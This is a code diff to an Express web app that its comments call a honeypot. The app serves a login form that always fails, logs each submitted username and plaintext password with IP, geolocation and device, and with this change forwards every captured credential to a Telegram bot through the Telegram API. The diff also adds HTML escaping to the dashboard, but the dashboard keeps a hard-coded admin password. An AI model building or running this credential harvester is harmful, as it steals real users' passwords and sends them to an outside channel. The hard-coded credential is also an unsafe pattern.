@@ -9,9 +9,46 @@ const app = express();
 const PORT = 4000;
 const LOG_FILE = path.join(__dirname, 'logs.json');
 
+// Telegram Bot Configuration (Apna Bot Token aur Chat ID yahan daalein)
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
 // Middleware setup
 app.use(useragent.express());
 app.use(express.urlencoded({ extended: true }));
+
+// Helper to prevent XSS by escaping HTML characters
+function escapeHtml(text) {
+    if (!text) return '';
+    return String(text)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
+
+// Function to send instant Telegram alert
+async function sendTelegramAlert(logEntry) {
+    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+    
+    const message = `🚨 *New Honeypot Capture!*\n\n` +
+                    `👤 *User:* ${escapeHtml(logEntry.username)}\n` +
+                    `🔑 *Pass:* ${escapeHtml(logEntry.password)}\n` +
+                    `🌐 *IP:* ${logEntry.ip}\n` +
+                    `📍 *Location:* ${logEntry.location?.city || 'N/A'}, ${logEntry.location?.country || 'N/A'}\n` +
+                    `💻 *Device:* ${logEntry.browser} / ${logEntry.os}`;
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+    } catch (err) {
+        console.error('Telegram alert failed:', err.message);
+    }
+}
 
 // Helper function to read and append logs to file
 function saveLog(newLog) {
@@ -72,11 +109,12 @@ app.post('/login', async (req, res) => {
     };
 
     saveLog(logEntry);
+    await sendTelegramAlert(logEntry);
 
     res.send('<h3>Authentication Failed. Please try again.</h3>');
 });
 
-// Protected Admin Dashboard with Download Button & Location Columns
+// Protected Admin Dashboard with Download Button & Sanitized Inputs
 app.get('/dashboard', basicAuth({
     users: { 'admin': 'SuperSecretPassword123' },
     challenge: true,
@@ -97,12 +135,12 @@ app.get('/dashboard', basicAuth({
         
         return `
             <tr>
-                <td>${log.time || ''}</td>
-                <td>${log.ip || ''}</td>
-                <td><strong>${log.username || ''}</strong></td>
-                <td><code style="background: #eee; padding: 2px 5px; border-radius: 3px;">${log.password || ''}</code></td>
-                <td>${city}, ${country}</td>
-                <td>${log.browser || 'Unknown'} / ${log.os || 'Unknown'}</td>
+                <td>${escapeHtml(log.time)}</td>
+                <td>${escapeHtml(log.ip)}</td>
+                <td><strong>${escapeHtml(log.username)}</strong></td>
+                <td><code style="background: #eee; padding: 2px 5px; border-radius: 3px;">${escapeHtml(log.password)}</code></td>
+                <td>${escapeHtml(city)}, ${escapeHtml(country)}</td>
+                <td>${escapeHtml(log.browser)} / ${escapeHtml(log.os)}</td>
             </tr>
         `;
     }).join('');
